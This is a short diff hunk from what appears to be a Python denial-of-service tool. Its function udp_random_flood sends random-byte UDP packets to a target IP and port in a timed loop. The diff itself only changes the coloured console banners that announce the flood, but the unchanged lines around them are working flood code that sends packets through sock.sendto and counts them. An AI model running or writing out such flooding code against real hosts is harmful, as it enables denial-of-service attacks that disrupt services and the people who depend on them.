@@ -57,8 +57,8 @@ def udp_random_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[100m \033[44mStarting UDP Random flood on \033[0m \033[32m" +str(ip)+ " \033[33m0k..!\033[0m")
-            print("\033[94m Starting UDP Plain flood on \033[97m" +str(packet_size)+ " \033[38;5;5mm0k...!\033[0m")
+            print("\033[48;5;3mStarting UDP Random flood on \033[0m \033[32m" +str(ip)+ " \033[33m0k..!\033[0m")
+            print("\033[33m Starting UDP Random flood on \033[97m" +str(packet_size)+ " \033[38;5;5mm0k...!\033[0m")
             payload = random.randbytes(packet_size)  # Random payload
             sock.sendto(payload, (ip, port))
             packet_count += 1
